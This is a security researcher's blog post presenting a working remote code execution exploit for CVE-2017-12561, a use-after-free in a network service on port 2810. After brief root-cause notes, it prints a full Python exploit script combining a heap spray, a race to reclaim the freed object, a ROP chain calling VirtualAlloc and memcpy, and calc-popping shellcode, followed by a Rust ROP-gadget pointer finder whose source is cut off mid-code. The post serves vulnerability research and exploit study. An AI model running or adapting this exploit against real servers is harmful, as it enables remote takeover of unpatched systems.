<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta content="IE=edge" http-equiv="X-UA-Compatible" />
<meta content="text/html; charset=UTF-8" http-equiv="content-type" />
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
<meta name="robots" content="index, follow">










<title>1922-Day for CVE-2017-12561</title>



<meta name="title" content="1922-Day for CVE-2017-12561">



<meta property="og:type" content="website">
<meta property="og:url" content="https://guas.ch/blog/1922-day-cve-2017-12561/">

<meta property="og:site_name" content="">


<meta property="og:title" content="1922-Day for CVE-2017-12561">





<meta property="twitter:card" content="summary_large_image">
<meta property="twitter:url" content="https://guas.ch/blog/1922-day-cve-2017-12561/">

<meta property="twitter:title" content="1922-Day for CVE-2017-12561">




<link rel="canonical" href="https://guas.ch/blog/1922-day-cve-2017-12561/">




<link rel="alternate" type="application/atom+xml" title="RSS" href="https://guas.ch/atom.xml"> 



<link rel="stylesheet" href="https://guas.ch/css/style.css" />

<script defer>
    const setTheme = (theme) => {
        document.documentElement.className = theme;
        localStorage.setItem('theme', theme);
    }

    const hasCodeRun = localStorage.getItem('hasCodeRun');

    if (!hasCodeRun) {
        const defaultTheme = "light";
        setTheme(defaultTheme);
        localStorage.setItem('hasCodeRun', 'true');
    }

    const getTheme = () => {
        const theme = localStorage.getItem('theme');
        if (theme) {
            setTheme(theme);
        }
    }

    getTheme();

</script>
</head>
<body>
    <div class="wrapper">
      <header>
          

  


  <nav class="navBar">
    
      <a href="&#x2F;" class="">
        
        &#x2F;whoami&#x2F;
      </a>
    
      <a href="&#x2F;blog" class="">
        
        &#x2F;blog&#x2F;
      </a>
    

  <div class="themeSwitch">
    
    <button class="themeButton light" onclick="setTheme('light')" title="Light mode"><svg class="icons icons__background"> <use href="https://guas.ch/icons.svg#lightMode"></use></svg></button>
    <button class="themeButton dark" onclick="setTheme('dark')" title="Dark mode"><svg class="icons icons__background"><use href="https://guas.ch/icons.svg#darkMode"></use></svg></button>

    
  </div>
</nav>


      </header>
      <main>
          
<div><a href="..">..</a>/<span class="metaData">1922-day-cve-2017-12561</span></div>
<time datetime="2023-01-07">Published on: <span class="metaData">2023-01-07</span></time>

<h1>1922-Day for CVE-2017-12561</h1>



<p>I decided to share my exploit for CVE-2017-12561 since <code>@primal0xF7</code> already made public an exploit for it and I believe it's useful to see different ways of exploiting the same vulnerability.</p>
<blockquote>
<p>Recently, it was necessary to write an RCE exploit for a remote UAF N-day vulnerability (ZDI-17-836). This post goes through root cause analysis and exploitation. Also, I present a tool / methodology to avoid heap sprays.<a href="https://t.co/nCHNXTGgFs">https://t.co/nCHNXTGgFs</a></p>&mdash; Faisal Tameesh (@primal0xF7) <a href="https://twitter.com/primal0xF7/status/1610281318998315008?ref_src=twsrc%5Etfw">January 3, 2023</a>
</blockquote>
<p>I'm not going to explain much about the vulnerability so go read <code>@primal0xF7</code>'s blog post first, it's also good manners since he was the first to publish the exploit.</p>
<h2 id="cve-2017-12561-zdi-17-836">CVE-2017-12561 (ZDI-17-836)</h2>
<p>You can find the advisory for this vulnerability in the following <a href="https://www.zerodayinitiative.com/advisories/ZDI-17-836/">link</a>. We basically have a binary listening in port 2810 that parses different commands, the command 10012 deletes the input handler object after an error without taking into account that it's later used by another function.</p>
<h3 id="the-use-state">The Use state</h3>
<p>The executable makes use of the freed object by calling a function in its virtual function table (vftable) at offset 0x28. Also if the value at offset 0x14 is zero it later calls the virtual function at offset 0x4C. I like the second call more because EAX points to the vftable which means it's easier to find nice ROP gadgets.</p>
<pre data-lang="nasm" style="background-color:#2b303b;color:#c0c5ce;" class="language-nasm "><code class="language-nasm" data-lang="nasm"><span style="color:#b48ead;">mov     </span><span style="color:#bf616a;">edx</span><span>, [</span><span style="color:#bf616a;">esi</span><span>]</span><span style="color:#65737e;"> ; ESI points to freed object
</span><span style="color:#b48ead;">mov     </span><span style="color:#bf616a;">edx</span><span>, [</span><span style="color:#bf616a;">edx</span><span>+</span><span style="color:#d08770;">28h</span><span>]
</span><span style="color:#b48ead;">test    </span><span style="color:#bf616a;">eax</span><span>, </span><span style="color:#bf616a;">eax</span><span style="color:#65737e;">   ; EAX is [ESI+0x14]
</span><span style="color:#b48ead;">mov     </span><span style="color:#bf616a;">eax</span><span>, [</span><span style="color:#bf616a;">esp</span><span>+</span><span style="color:#d08770;">24h</span><span>+</span><span style="color:#8fa1b3;">var_4</span><span>]
</span><span style="color:#b48ead;">push    </span><span style="color:#bf616a;">eax
</span><span style="color:#b48ead;">push    </span><span style="color:#bf616a;">ecx
</span><span style="color:#b48ead;">mov     </span><span style="color:#bf616a;">ecx</span><span>, </span><span style="color:#bf616a;">esi
</span><span style="color:#b48ead;">setz    </span><span style="color:#bf616a;">bl
</span><span style="color:#b48ead;">call    </span><span style="color:#bf616a;">edx
</span><span style="color:#b48ead;">test    </span><span style="color:#bf616a;">bl</span><span>, </span><span style="color:#bf616a;">bl
</span><span style="color:#b48ead;">jz      </span><span style="color:#8fa1b3;">short loc_1007B83C
</span><span style="color:#b48ead;">mov     </span><span style="color:#bf616a;">eax</span><span>, [</span><span style="color:#bf616a;">esi</span><span>]
</span><span style="color:#b48ead;">mov     </span><span style="color:#bf616a;">edx</span><span>, [</span><span style="color:#bf616a;">eax</span><span>+</span><span style="color:#d08770;">4Ch</span><span>]
</span><span style="color:#b48ead;">mov     </span><span style="color:#bf616a;">ecx</span><span>, </span><span style="color:#bf616a;">esi
</span><span style="color:#b48ead;">call    </span><span style="color:#bf616a;">edx
</span></code></pre>
<p>The object is allocated as 0x28 sized heap memory (0x24 requested and 8 byte alligned), we do not care much about its fields aside from the vftable and possibly the offset 0x14 if we want to use the second call.</p>
<div class="textCenter">
  <a class="lightbox" href="img&#x2F;heap_object.png">
    <img src="img&#x2F;heap_object.png" >
  </a>
  
</div><h3 id="the-exploit">The exploit</h3>
<p>After a brief look at some of the available commands I noticed that command 10001 does not free the allocated memory for the command after an error. That means we have a primitive to allocate arbitrary sized memory with arbitrary contents.</p>
<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#b48ead;">case </span><span style="color:#d08770;">0x2711</span><span style="color:#b48ead;">u</span><span>:
</span><span>    *(_DWORD *)v379 = ACE_SOCK_IO::</span><span style="color:#bf616a;">recv</span><span>((ACE_SOCK_IO *)&amp;v377, &amp;netlong, </span><span style="color:#d08770;">4</span><span style="color:#b48ead;">u</span><span>, </span><span style="color:#d08770;">0</span><span>);
</span><span>    </span><span style="color:#b48ead;">if </span><span>( *(_DWORD *)v379 == </span><span style="color:#d08770;">4 </span><span>)
</span><span>    {
</span><span>      netlong = ((((</span><span style="color:#b48ead;">int</span><span>)netlong s&gt;&gt; </span><span style="color:#d08770;">16</span><span>) &amp; </span><span style="color:#d08770;">0xFF00</span><span>) s&gt;&gt; </span><span style="color:#d08770;">8</span><span>) | (</span><span style="color:#bf616a;">BYTE2</span><span>(netlong) &lt;&lt; </span><span style="color:#d08770;">8</span><span>) | ((((</span><span style="color:#b48ead;">int</span><span>)(netlong &amp; </span><span style="color:#d08770;">0xFF00</span><span>) s&gt;&gt; </span><span style="color:#d08770;">8</span><span>) | ((</span><span style="color:#b48ead;">unsigned</span><span> __int8netlong &lt;&lt; </span><span style="color:#d08770;">8</span><span>)) &lt;&lt; </span><span style="color:#d08770;">16</span><span>);
</span><span>      v312 = (</span><span style="color:#b48ead;">char </span><span>*)operator new[](netlong); </span><span style="color:#65737e;">// We control this allocation
</span><span>      v364 = v312;
</span><span>      </span><span style="color:#65737e;">// We control this content
</span><span>      *(_DWORD *)v379 = ACE_SOCK_IO::</span><span style="color:#bf616a;">recv</span><span>((ACE_SOCK_IO *)&amp;v377, v312, netlong, </span><span style="color:#d08770;">0</span><span>);
</span><span>      </span><span style="color:#b48ead;">if </span><span>( *(_DWORD *)v379 == netlong )
</span><span>      {
</span><span>        </span><span style="color:#65737e;">// SNIP
</span><span>      }
</span><span>      </span><span style="color:#b48ead;">else
</span><span>      {
</span><span>        </span><span style="color:#65737e;">// O-perator delete[](v364), Where Art Thou?
</span><span>        v57 = -</span><span style="color:#d08770;">1</span><span>;
</span><span>        v311 = &amp;v52;
</span><span>        v165 = &amp;v52;
</span><span>        SNACC::AsnEnum::</span><span style="color:#bf616a;">AsnEnum</span><span>((SNACC::AsnEnum *)&amp;v52, </span><span style="color:#d08770;">1</span><span>);
</span><span>        *v165 = (</span><span style="color:#b48ead;">int</span><span>)&amp;SNACC::AsnDbmanCmdCode::`vftable&#39;</span><span style="color:#a3be8c;">;
</span><span style="color:#a3be8c;">        v165[2] = (int)&amp;SNACC::AsnDbmanCmdCode::`vftable</span><span>&#39;;
</span><span>        v111 = v165;
</span><span>        </span><span style="color:#bf616a;">sub_464510</span><span>((ACE_SOCK_Stream *)&amp;v377, v51, v52, v53, v54, v55, v56);
</span><span>        </span><span style="color:#bf616a;">sub_475470</span><span>(
</span><span>          </span><span style="color:#d08770;">1</span><span>,
</span><span>          v376,
</span><span>          &quot;</span><span style="color:#a3be8c;">Receive AsnDbmanCmdCode::iMSG_V001_REMOTE_DISK_DIRECTORY_REVIEW_PLAT_REQ data error expect </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;"> byte</span><span>&quot;
</span><span>          &quot;</span><span style="color:#a3be8c;">s infact </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;"> bytes</span><span>&quot;,
</span><span>          netlong,
</span><span>          *(_DWORD *)v379);
</span><span>        v310 = -</span><span style="color:#d08770;">1</span><span>;
</span><span>        v382 = -</span><span style="color:#d08770;">1</span><span>;
</span><span>        ACE_SOCK_Stream::~</span><span style="color:#bf616a;">ACE_SOCK_Stream</span><span>((ACE_SOCK_Stream *)&amp;v377);
</span><span>        result = v310;
</span><span>      }
</span></code></pre>
<p>Since I'm lazy I initially tried sending a large packet (around 0x1000000 bytes) containing my ROP chain repeated at regular intervals. The idea was to have the chain act as a fake vftable and then overwrite the vftable pointer to point to a heap address that I would surely control after sending such a large packet.</p>
<p>Unfortunately, the executable is not very nice and stops receiving bytes after around 0x2000, which makes me sad :(. So instead of sending a single 0x1000000 sized packet I send 0x10000 packets with size 0xf8 containing my ROP chain. That means we still control those 0x1000000 minus the heap metadata and a packet size of 0xf8 makes sure our packets will be 0x100 alligned in memory. We end up with a memory layout looking something like this:</p>
<div class="textCenter">
  <a class="lightbox" href="img&#x2F;heap_state.png">
    <img src="img&#x2F;heap_state.png" >
  </a>
  
</div>
<p>We then race the UAF by sending commands 10001 in a loop that allocate objects of size 0x28, if we get lucky we will overwrite the UAF object and point the the vftable to our fake vftable that we sprayed in the heap.</p>
<p>I then created a simple ROP chain that uses <code>xchg eax, esp; ret</code> to pivot the stack to our controlled fake vftable, a good reason to use the second call instead of the first in the &quot;use&quot; state. The ROP chain then saves the original stack pointer in ESI for process continuation, which I didn't end up implementing. The chain then calls VirtualAlloc from the imports table to allocate RWX memory at a known address and then uses memcpy to write a shellcode to that address and finally jumps to it.</p>
<p>Below you can find a video popping a calculator since it's customary and the exploit code.
<div class="textCenter">
    <iframe
        src="https://www.youtube-nocookie.com/embed/-XKOOgto86g"
        allow="accelerometer; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
        webkitallowfullscreen
        mozallowfullscreen
        allowfullscreen>
    </iframe>
</div></p>
<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">import </span><span>socket, struct, time
</span><span style="color:#b48ead;">from </span><span>multiprocessing </span><span style="color:#b48ead;">import </span><span>Process
</span><span>
</span><span style="color:#bf616a;">HOST</span><span>=&quot;</span><span style="color:#a3be8c;">PUT.SERVER.IP.HERE</span><span>&quot;
</span><span style="color:#bf616a;">PORT</span><span>=</span><span style="color:#d08770;">2810
</span><span>socket.</span><span style="color:#bf616a;">timeout</span><span>(</span><span style="color:#d08770;">10</span><span>)
</span><span>
</span><span>u32 = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">ba</span><span>: struct.</span><span style="color:#bf616a;">unpack</span><span>(&#39;</span><span style="color:#a3be8c;">&lt;L</span><span>&#39;, ba)[</span><span style="color:#d08770;">0</span><span>]
</span><span>p32 = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">i</span><span>: struct.</span><span style="color:#bf616a;">pack</span><span>(&#39;</span><span style="color:#a3be8c;">&lt;L</span><span>&#39;,i)
</span><span>
</span><span style="color:#65737e;"># SkyLined&#39;s Calc shellcode
</span><span>calc = (
</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64</span><span>&quot;
</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B</span><span>&quot;
</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20</span><span>&quot;
</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07</span><span>&quot;
</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x57\x69\x6E\x45\x75\xF5\x0F\xB7\x54\x51\xFE\x8B\x74</span><span>&quot;
</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7</span><span>&quot;)
</span><span>
</span><span>
</span><span>rop_chain = </span><span style="color:#bf616a;">p32</span><span>(</span><span style="color:#d08770;">0x489c45</span><span>)   </span><span style="color:#65737e;"># 0x489c45 --&gt; xchg eax, edi ; ret ; \x97\xc3
</span><span>rop_chain+= </span><span style="color:#bf616a;">p32</span><span>(</span><span style="color:#d08770;">0x1005084E</span><span>) </span><span style="color:#65737e;"># jmp VirtualAlloc
</span><span>rop_chain+= </span><span style="color:#bf616a;">p32</span><span>(</span><span style="color:#d08770;">0x428f50</span><span>)   </span><span style="color:#65737e;"># 0x428f50 --&gt; ret ; \x64\xc3
</span><span>rop_chain+= </span><span style="color:#bf616a;">p32</span><span>(</span><span style="color:#d08770;">0x06000000</span><span>) </span><span style="color:#65737e;"># lpAddress
</span><span>rop_chain+= </span><span style="color:#bf616a;">p32</span><span>(</span><span style="color:#d08770;">0x00001000</span><span>) </span><span style="color:#65737e;"># dwSize
</span><span>rop_chain+= </span><span style="color:#bf616a;">p32</span><span>(</span><span style="color:#d08770;">0x00003000</span><span>) </span><span style="color:#65737e;"># flAllocationType (MEM_COMMIT | MEM_RESERVE)
</span><span>rop_chain+= </span><span style="color:#bf616a;">p32</span><span>(</span><span style="color:#d08770;">0x000040</span><span>)   </span><span style="color:#65737e;"># flProtect
</span><span>rop_chain+= </span><span style="color:#bf616a;">p32</span><span>(</span><span style="color:#d08770;">0x428f50</span><span>)   </span><span style="color:#65737e;"># 0x428f50 --&gt; ret ; \x64\xc3
</span><span>rop_chain+= </span><span style="color:#bf616a;">p32</span><span>(</span><span style="color:#d08770;">0x428f50</span><span>)   </span><span style="color:#65737e;"># 0x428f50 --&gt; ret ; \x64\xc3
</span><span>rop_chain+= </span><span style="color:#bf616a;">p32</span><span>(</span><span style="color:#d08770;">0x428f9f</span><span>)   </span><span style="color:#65737e;"># 0x428f9f --&gt; pop eax ; ret ; \x58\xc3
</span><span>
</span><span>rop_chain2 =</span><span style="color:#bf616a;">p32</span><span>(</span><span style="color:#d08770;">0x049B05E</span><span>)  </span><span style="color:#65737e;"># jmp memcpy
</span><span>rop_chain2+=</span><span style="color:#bf616a;">p32</span><span>(</span><span style="color:#d08770;">0x06000000</span><span>) </span><span style="color:#65737e;"># lpAddress
</span><span>rop_chain2+=</span><span style="color:#bf616a;">p32</span><span>(</span><span style="color:#d08770;">0x06000000</span><span>) </span><span style="color:#65737e;"># dest (lpAddress)
</span><span>rop_chain2+=</span><span style="color:#bf616a;">p32</span><span>(</span><span style="color:#d08770;">0x33150B0</span><span>)  </span><span style="color:#65737e;"># src (shellcodeAddress)
</span><span>rop_chain2+=</span><span style="color:#bf616a;">p32</span><span>(</span><span style="color:#96b5b4;">len</span><span>(calc))  </span><span style="color:#65737e;"># count
</span><span>
</span><span>
</span><span>payload = rop_chain
</span><span>payload+= </span><span style="color:#bf616a;">p32</span><span>(</span><span style="color:#d08770;">0x403610</span><span>) </span><span style="color:#65737e;"># heap + 0x28: 0x403610: retn 0x0008 ; \xc2\x08\x00
</span><span>payload+= rop_chain2
</span><span>payload+= </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">B</span><span>&quot;*</span><span style="color:#d08770;">0xC      </span><span style="color:#65737e;"># padding
</span><span>payload+= </span><span style="color:#bf616a;">p32</span><span>(</span><span style="color:#d08770;">0x428e15</span><span>) </span><span style="color:#65737e;"># heap + 0x4c: 0x428e15 --&gt; xchg eax, esp ; ret ; \x94\xc3
</span><span>payload+= calc          </span><span style="color:#65737e;"># shellcode
</span><span>
</span><span>heap_addr = </span><span style="color:#bf616a;">p32</span><span>(</span><span style="color:#d08770;">0x3315060</span><span>) </span><span style="color:#65737e;"># target heap address after heap spray
</span><span>
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">heap_spray</span><span>():
</span><span>    </span><span style="color:#b48ead;">for </span><span>j </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">16</span><span>):
</span><span>        </span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">4096</span><span>):
</span><span>            </span><span style="color:#b48ead;">with </span><span>socket.</span><span style="color:#bf616a;">socket</span><span>(socket.</span><span style="color:#bf616a;">AF_INET</span><span>,socket.</span><span style="color:#bf616a;">SOCK_STREAM</span><span>) </span><span style="color:#b48ead;">as </span><span>s:
</span><span>                s.</span><span style="color:#bf616a;">connect</span><span>((</span><span style="color:#bf616a;">HOST</span><span>,</span><span style="color:#bf616a;">PORT</span><span>))
</span><span>                s.</span><span style="color:#bf616a;">sendall</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x00\x00\x27\x11\x00\x00\x00\xf8</span><span>&quot;+payload)
</span><span>
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">trigger_uaf</span><span>():
</span><span>    </span><span style="color:#b48ead;">while </span><span style="color:#d08770;">True</span><span>:
</span><span>        </span><span style="color:#b48ead;">with </span><span>socket.</span><span style="color:#bf616a;">socket</span><span>(socket.</span><span style="color:#bf616a;">AF_INET</span><span>,socket.</span><span style="color:#bf616a;">SOCK_STREAM</span><span>) </span><span style="color:#b48ead;">as </span><span>s:
</span><span>            s.</span><span style="color:#bf616a;">connect</span><span>((</span><span style="color:#bf616a;">HOST</span><span>,</span><span style="color:#bf616a;">PORT</span><span>))
</span><span>            s.</span><span style="color:#bf616a;">send</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x00\x00\x27\x1c\x00\x00\x00\x04</span><span style="color:#a3be8c;">AAAA</span><span>&quot;)
</span><span>            </span><span style="color:#96b5b4;">print</span><span>(&quot;</span><span style="color:#a3be8c;">.</span><span>&quot;)
</span><span>            time.</span><span style="color:#bf616a;">sleep</span><span>(</span><span style="color:#d08770;">0.5</span><span>)
</span><span>
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">race_uaf</span><span>():
</span><span>    </span><span style="color:#b48ead;">while </span><span style="color:#d08770;">True</span><span>:
</span><span>        </span><span style="color:#b48ead;">with </span><span>socket.</span><span style="color:#bf616a;">socket</span><span>(socket.</span><span style="color:#bf616a;">AF_INET</span><span>,socket.</span><span style="color:#bf616a;">SOCK_STREAM</span><span>) </span><span style="color:#b48ead;">as </span><span>s:
</span><span>            s.</span><span style="color:#bf616a;">connect</span><span>((</span><span style="color:#bf616a;">HOST</span><span>,</span><span style="color:#bf616a;">PORT</span><span>))
</span><span>            s.</span><span style="color:#bf616a;">send</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x00\x00\x27\x11\x00\x00\x00\x28</span><span>&quot;+heap_addr+</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x00</span><span>&quot;*</span><span style="color:#d08770;">0x20</span><span>)
</span><span>
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">main</span><span>():
</span><span>    </span><span style="color:#bf616a;">heap_spray</span><span>()
</span><span>    </span><span style="color:#96b5b4;">input</span><span>(&quot;</span><span style="color:#a3be8c;">Press enter to race</span><span>&quot;)
</span><span>    </span><span style="color:#96b5b4;">print</span><span>(&quot;</span><span style="color:#a3be8c;">Vroooom</span><span>&quot;)
</span><span>    p = </span><span style="color:#bf616a;">Process</span><span>(</span><span style="color:#bf616a;">target</span><span>=race_uaf)
</span><span>    p2 = </span><span style="color:#bf616a;">Process</span><span>(</span><span style="color:#bf616a;">target</span><span>=trigger_uaf)
</span><span>    p.</span><span style="color:#bf616a;">start</span><span>()
</span><span>    time.</span><span style="color:#bf616a;">sleep</span><span>(</span><span style="color:#d08770;">5</span><span>)
</span><span>    p2.</span><span style="color:#bf616a;">start</span><span>()
</span><span>    p.</span><span style="color:#bf616a;">join</span><span>()
</span><span>    p2.</span><span style="color:#bf616a;">join</span><span>()
</span><span>
</span><span style="color:#b48ead;">if </span><span>__name__ == &quot;</span><span style="color:#a3be8c;">__main__</span><span>&quot;:
</span><span>    </span><span style="color:#bf616a;">main</span><span>()
</span></code></pre>
<h3 id="improvements">Improvements</h3>
<p>Some stuff that I left out and it would be nice to add:</p>
<ul>
<li><strong>UAF race stability</strong>: the racing of the UAF to overwrite the used object is not reliable and the exploit crashes sometimes.</li>
<li><strong>Process continuation</strong>: simply use the saved stack to repair the changes and also stop triggering the UAF in a loop.</li>
<li><strong>Adjust heap spray</strong>: the exploit spends a couple of seconds spraying the heap, with a bit more analysis we could reduce the number of sent packets and time spent. </li>
</ul>
<h2 id="extras">Extras</h2>
<p>Since I liked the script created by <code>@primal0xF7</code> and I needed an excuse to write some Rust, I reimplemented it with some extra features.</p>
<ul>
<li>Multithreading</li>
<li>Detects endianness and address size from the provided executable</li>
<li>Uses the image base of the executable</li>
</ul>
<pre data-lang="text" style="background-color:#2b303b;color:#c0c5ce;" class="language-text "><code class="language-text" data-lang="text"><span>$ gyul --help
</span><span>Simple program to find pointers to ROP gadgets
</span><span>
</span><span>Usage: gyul [OPTIONS] --gadgets-file &lt;GADGETS_FILE&gt; --executable &lt;EXECUTABLE&gt;
</span><span>
</span><span>Options:
</span><span>  -g, --gadgets-file &lt;GADGETS_FILE&gt;  File containing ROP gadgets generated by rp++
</span><span>  -e, --executable &lt;EXECUTABLE&gt;      Executable where we will search for pointers to ROP gadgets
</span><span>  -b, --base-address &lt;BASE_ADDRESS&gt;  Hexadecimal address to use for pointer rebasing [default: image_base]
</span><span>  -h, --help                         Print help information
</span><span>  -V, --version                      Print version information
</span></code></pre>
<p>I might clean it up a bit and upload it to a GitHub repository, but in the meantime you can find the code below.</p>
<pre data-lang="rust" style="background-color:#2b303b;color:#c0c5ce;" class="language-rust "><code class="language-rust" data-lang="rust"><span style="color:#b48ead;">use </span><span>clap::Parser;
</span><span style="color:#b48ead;">use </span><span>object::{Endianness, File, Object, ObjectSection};
</span><span style="color:#b48ead;">use </span><span>rayon::prelude::*;
</span><span style="color:#b48ead;">use </span><span>regex::Regex;
</span><span style="color:#b48ead;">use </span><span>std::{fs, ops::Deref};
</span><span>
</span><span style="color:#65737e;">/// Simple program to find pointers to ROP gadgets
</span><span>#[</span><span style="color:#bf616a;">derive</span><span>(Parser, Debug)]
</span><span>#[</span><span style="color:#bf616a;">command</span><span>(version)]
</span><span style="color:#b48ead;">struct </span><span>Args {
</span><span>    </span><span style="color:#65737e;">/// File containing ROP gadgets generated by rp++
</span><span>    #[</span><span style="color:#bf616a;">arg</span><span>(short, long)]
</span><span>    </span><span style="color:#bf616a;">gadgets_file</span><span>: String,
</span><span>
</span><span>    </span><span style="color:#65737e;">/// Executable where we will search for pointers to ROP gadgets
</span><span>    #[</span><span style="color:#bf616a;">arg</span><span>(short, long)]
</span><span>    </span><span style="color:#bf616a;">executable</span><span>: String,
</span><span>
</span><span>    </span><span style="color:#65737e;">/// Hexadecimal address to use for pointer rebasing [default: image_base]
</span><span>    #[</span><span style="color:#bf616a;">arg</span><span>(short, long, value_parser = parse_hex )]
</span><span>    </span><span style="color:#bf616a;">base_address</span><span>: Option&lt;</span><span style="color:#b48ead;">usize</span><span>&gt;,
</span><span>}
</span><span>
</span><span style="color:#b48ead;">fn </span><span style="color:#8fa1b3;">parse_hex</span><span>(</span><span style="color:#bf616a;">hex_str</span><span>: &amp;</span><span style="color:#b48ead;">str</span><span>) -&gt; Result&lt;</span><span style="color:#b48ead;">usize</span><span>, std::num::ParseIntError&gt; {
</span><span>    </span><span style="color:#b48ead;">let</span><span> clean_hex = hex_str.</span><span style="color:#96b5b4;">strip_prefix</span><span>(&quot;</span><span style="color:#a3be8c;">0x</span><span>&quot;).</span><span style="color:#96b5b4;">unwrap_or</span><span>(hex_str);
</span><span>    </span><span style="color:#b48ead;">usize</span><span>::from_str_radix(clean_hex, </span><span style="color:#d08770;">16</span><span>)
</span><span>}
</span><span>
</span><span style="color:#b48ead;">fn </span><span style="color:#8fa1b3;">main</span><span>() {
</span><span>    </span><span style="color:#b48ead;">let</span><span> args = Args::parse();
</span><span>
</span><span>    </span><span style="color:#65737e;">// Read the executable file and extract the endianness and the address size of the file
</span><span>    </span><span style="color:#b48ead;">let</span><span> file_bytes = fs::read(args.executable).</span><span style="color:#96b5b4;">expect</span><span>(&quot;</span><span style="color:#a3be8c;">Error reading executable file</span><span>&quot;);
</span><span>    </span><span style="color:#b48ead;">let</span><span> obj_file = File::parse(file_bytes.</span><span style="color:#96b5b4;">deref</span><span>()).</span><span style="color:#96b5b4;">expect</span><span>(&quot;</span><span style="color:#a3be8c;">Error parsing executable</span><span>&quot;);
</span><span>    </span><span style="color:#b48ead;">let</span><span> obj_endianness = obj_file.</span><span style="color:#96b5b4;">endianness</span><span>();
</span><span>    </span><span style="color:#b48ead;">let</span><span> obj_address_size = obj_file
</span><span>        .</span><span style="color:#96b5b4;">architecture</span><span>()
</span><span>        .</span><span style="color:#96b5b4;">address_size</span><span>()
</span><span>        .</span><span style="color:#96b5b4;">expect</span><span>(&quot;</span><span style="color:#a3be8c;">Unknown architecture</span><span>&quot;)
</span><span>        .</span><span style="color:#96b5b4;">bytes</span><span>() as </span><span style="color:#b48ead;">usize</span><span>;
</span><span>
</span><span>    </span><span style="color:#65737e;">// Calculate the base address to use for pointer rebasing
</span><span>    </span><span style="color:#b48ead;">let</span><span> base_address = args
</span><span>        .base_address
</span><span>        .</span><span style="color:#96b5b4;">unwrap_or</span><span>(obj_file.</span><span style="color:#96b5b4;">relative_address_base</span><span>() as </span><span style="color:#b48ead;">usize</span><span>);
</span><span>
</span><span>    </span><span style="color:#65737e;">// Extract the sections of the object as a vector of tuples, where each tuple contains the address of the section and its data
</span><span>    </span><span style="color:#b48ead;">let</span><span> sections_bytes: Vec&lt;(</span><span style="color:#b48ead;">usize</span><span>, &amp;[</span><span style="color:#b48ead;">u8</span><span>])&gt; = obj_file
</span><span>        .</span><span style="color:#96b5b4;">sections</span><span>()
</span><span>        .</span><span style="color:#96b5b4;">map</span><span>(|</span><span style="color:#bf616a;">s</span><span>| {
</span><span>            (
</span><span>                (s.</span><span style="color:#96b5b4;">address</span><span>() - obj_file.</span><span style="color:#96b5b4;">relative_address_base</span><span>()) as </span><span style="color:#b48ead;">usize</span><span>,
</span><span>                s.</span><span style="color:#96b5b4;">data</span><span>().</span><span style="color:#96b5b4;">unwrap_or_default</span><span>(),
</span><span>            )
</span><span>        })
</span><span>        .</span><span style="color:#96b5b4;">collect</span><span>();
</span><span>
</span><span>    </span><span style="color:#65737e;">// Read the ROP gadgets file and extract the hexadecimal addresses and the corresponding lines of ROP gadgets.
</span><span>    </span><span style="color:#65737e;">// Parse the addresses into a byte array depending on the endianness of the executable file.
</span><span>    </span><span style="color:#b48ead;">let</span><span> rop_gadgets = fs::read_to_string(args.gadgets_file).</span><span style="color:#96b5b4;">expect</span><span>(&quot;</span><span style="color:#a3be8c;">Error reading file</span><span>&quot;);
</span><span>    </span><span style="color:#b48ead;">let</span><span> re = Regex::new(</span><span style="color:#b48ead;">r</span><span>&quot;</span><span style="color:#a3be8c;">^0x([0-9a-fA-F]+):</span><span>&quot;).</span><span style="color:#96b5b4;">unwrap</span><span>();
</span><span>    </span><span style="color:#b48ead;">let mut</span><span> addresses: Vec&lt;[</span><span style="color:#b48ead;">u8</span><span>; </span><span style="color:#d08770;">8</span><span>]&gt; = Vec::new();
</span><span>    </span><span style="color:#b48ead;">let mut</span><span> rop_lines = Vec::new();
</span><span>    </span><span style="color:#b48ead;">for</span><span> line in rop_gadgets.</span><span style="color:#96b5b4;">lines</span><span>() {
</span><span>        </span><span style="color:#b48ead;">if let </span><span>Some(captures) = re.</span><span style="color:#96b5b4;">captures</span><span>(line) {
</span><span>            </span><span style="color:#b48ead;">let</span><span> hex_address = captures.</span><span style="color:#96b5b4;">get</span><span>(</span><span style="color:#d08770;">1</span><span>).</span><span style="color:#96b5b4;">unwrap</span><span>().</span><span style="color:#96b5b4;">as_str</span><span>();
